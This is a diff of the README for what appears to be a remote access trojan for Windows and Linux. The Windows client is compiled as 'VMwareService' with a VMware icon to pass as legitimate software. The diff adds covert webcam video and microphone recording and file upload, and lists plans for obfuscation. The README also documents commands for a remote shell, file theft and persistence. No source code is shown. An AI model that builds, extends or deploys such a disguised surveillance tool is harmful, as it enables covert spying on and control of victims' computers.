@@ -5,24 +5,28 @@
 
 En desarollo...
 
+
 # Requirements:
   - Compilador GCC (preferiblemente de 64Bits) [DOWNLOAD LINK](https://github.com/brechtsanders/winlibs_mingw/releases/download/13.2.0mcf-16.0.6-11.0.1-ucrt-r2/winlibs-x86_64-mcf-seh-gcc-13.2.0-llvm-16.0.6-mingw-w64ucrt-11.0.1-r2.7z)
-  - Linux: `# apt install build-essential`  
+
+
+  - Linux: `# apt install build-essential ffmpeg libv4l-dev libssl-dev moreutils`  
+
+
+# On future
+- Code optimization to work across platforms
+
+        [WINDOWS]<---->[LINUX]
+
+- Add audio on linux & video on windows
+- Obfuscation.
 
 # News
 
-1. High Persistence Windows:
-    
-        Generamos un servicio de windows y lo configuramos para ejecutarse al arranque del sistema operativo
-2. Low persistence Windows:
+### Functions to record video & audio.
 
-        Entrada en el registro HKCU
-3. High Persistence Linux:
-
-        Generamos otro servicio para que se ejecute en el inicio del SO.
-4.  Low persistence Linux:
-
-        Generamos una tarea cron de usuario que se ejecuta al inciar el PC
+- LINUX: New function to record a 10s video (aprox)
+- Windows: New function to record a 10s of audio 
 
 
 # Preparation Linux
@@ -41,7 +45,7 @@ Modifica el archivo **[client.c](Linux/client.c)** para especificar la direcció
 
 - **Cliente:**
 
-        gcc linux/client.c -o linux/client
+        gcc linux/client.c -o linux/client -lv4l2
 - **Server:**
 
         gcc linux/client.c -o linux/client
@@ -67,13 +71,13 @@ Modificamos el archivo **[src/mainFuctsWin.c](src/mainFuctsWin.c)** especificand
 
 - [Cliente](Windows/client.c) + **VMWARE ICON**:
 
-      gcc -mwindows .\client.c -o .\dist\VMwareService -lws2_32 -lShlwapi ../src/icon.o
+      gcc -mwindows .\clientWin.c -o .\dist\VMwareService -lws2_32 -lShlwapi -lwinmm ../src/icon.o
 - [Cliente](Windows/client.c):
 
-      gcc -mwindows .\client.c -o .\dist\VMwareService -lws2_32 -lShlwapi 
+      gcc -mwindows .\clientWin.c -o .\dist\VMwareService -lws2_32 -lShlwapi -lwinmm
 - [Server](Windows/server.c):
 
-      gcc .\server.c -o .\dist\server -lws2_32 -lShlwapi
+      gcc .\serverWin.c -o .\dist\server -lws2_32 -lShlwapi
 
 
 ### 3. Execute:
@@ -90,9 +94,12 @@ Por el momento tenemos disponible los siguientes comandos:
     - shell           -> Enter shell mode ("q" for exit)
     - exec            -> Execute command without shell mode
     - download <file> -> Download file from target
+    - upload   <file> -> Upload local file to target
     - sysinfo         -> Show system info (better on linux)
     - lowpersistence  -> Set persistence (no root)
     - peristence      -> Set persistence (root needed)
     - check           -> List privileges
+    - record          -> Take a 10s audio [ONLY WINDOWS]
+    - video           -> Take a 10s video (720p) [ONLY LINUX]
     - q / exit        -> Exit server
     - q -y / exit -y  -> Exit server and client (close binary) 
